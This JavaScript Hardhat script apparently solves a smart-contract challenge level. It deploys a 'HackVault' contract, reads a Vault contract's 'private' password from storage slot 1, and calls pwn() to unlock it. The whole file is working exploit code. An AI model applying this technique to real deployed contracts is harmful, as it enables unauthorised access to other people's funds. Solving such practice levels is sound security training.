const { ethers } = require("hardhat")
const hre = require("hardhat")

const vaultAddress = "0x596dD2A8540d3E7284f8F5a201150564d8f0DA23"

async function main() {
    const vault = await hre.ethers.getContractAt("Vault", vaultAddress)

    const VaultExploit = await ethers.getContractFactory("HackVault")
    const vaultExploit = await VaultExploit.deploy(vaultAddress)

    await vaultExploit.deployed()

    console.log(`Exploit deployed to: ${vaultExploit.address}`)

    console.log("---------------------------------------")

    const hackedPsw = await getPassword(vault.address)
    console.log(`Password: ${hackedPsw}`)

    await vaultExploit.pwn(hackedPsw)

    const locked = await vault.locked()

    console.log(`Hacked? ${!locked}`)
}

async function getPassword(vaultAddress) {
    const psw = await ethers.provider.getStorageAt(vaultAddress, "0x1")

    return psw
}

main().catch((error) => {
    console.error(error)
    process.exitCode = 1
})
